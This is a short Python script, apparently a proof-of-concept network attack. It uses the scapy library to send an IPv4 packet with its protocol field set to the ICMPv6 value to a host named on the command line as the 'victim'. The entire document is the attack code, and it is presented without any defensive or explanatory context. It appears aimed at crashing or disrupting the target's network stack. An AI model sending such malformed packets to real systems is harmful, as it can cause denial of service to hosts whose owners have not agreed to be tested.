import sys
from scapy import *
victim=sys.argv[1]
icmpv6=58
p=IP(dst=victim)
p.proto=icmpv6
sr(p,timeout=1)